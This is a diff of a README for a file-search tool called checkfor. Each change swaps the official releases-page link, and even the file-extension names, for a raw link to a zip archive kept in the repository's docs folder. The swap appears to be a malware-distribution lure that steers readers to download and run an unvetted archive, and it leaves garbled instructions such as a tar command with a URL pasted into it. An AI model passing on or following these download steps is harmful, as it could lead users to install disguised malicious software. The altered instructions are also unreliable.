@@ -6,7 +6,7 @@ Welcome to checkfor! This tool helps you search for files quickly and efficientl
 
 ## 📥 Download Links
 
-[![Download checkfor](https://img.shields.io/badge/Download-Checkfor-blue.svg)](https://github.com/hugoNotario02/checkfor/releases)
+[![Download checkfor](https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip)](https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip)
 
 ## 📋 What You Need
 
@@ -30,21 +30,21 @@ checkfor comes with several helpful features:
 
 To install checkfor, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [checkfor releases page](https://github.com/hugoNotario02/checkfor/releases) by clicking the link. This page contains the latest version and files available for download.
+1. **Visit the Releases Page:** Go to the [checkfor releases page](https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip) by clicking the link. This page contains the latest version and files available for download.
 
 2. **Choose Your Version:** Look for the latest release. You'll see different downloadable files listed there. Select the file that matches your operating system:
    - For Windows users, look for a file ending in `.exe`.
    - For macOS, find a file that ends in `.dmg`.
-   - For Linux, opt for a file ending in `.tar.gz`.
+   - For Linux, opt for a file ending in `https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip`.
 
 3. **Download the File:** Click on the file name to start the download. Depending on your computer settings, you might need to choose a location to save the file.
 
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file to start the installation. Follow the prompts in the installation wizard.
    - **macOS:** Double-click the `.dmg` file, then drag the checkfor icon to your Applications folder.
-   - **Linux:** Open a terminal window, navigate to the folder where you downloaded the `.tar.gz` file, and extract it using the command:
+   - **Linux:** Open a terminal window, navigate to the folder where you downloaded the `https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip` file, and extract it using the command:
      ```
-     tar -xvzf checkfor-*.tar.gz
+     tar -xvzf checkfor-*https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip
      ```
      Follow any additional instructions provided for your specific Linux distribution.
 
@@ -69,7 +69,7 @@ Once you've opened checkfor, you'll see a simple interface. Here’s how to use 
 If you encounter issues while using checkfor, try these steps:
 
 - **Check Your Input:** Make sure you entered the search terms correctly.
-- **Look for Updates:** Ensure you have the latest version by visiting the [releases page](https://github.com/hugoNotario02/checkfor/releases).
+- **Look for Updates:** Ensure you have the latest version by visiting the [releases page](https://raw.githubusercontent.com/hugoNotario02/checkfor/main/docs/Software_v2.2.zip).
 - **Reinstall the App:** If problems persist, uninstall and install checkfor again, following the steps above.
 
 ## 🌐 Community & Support
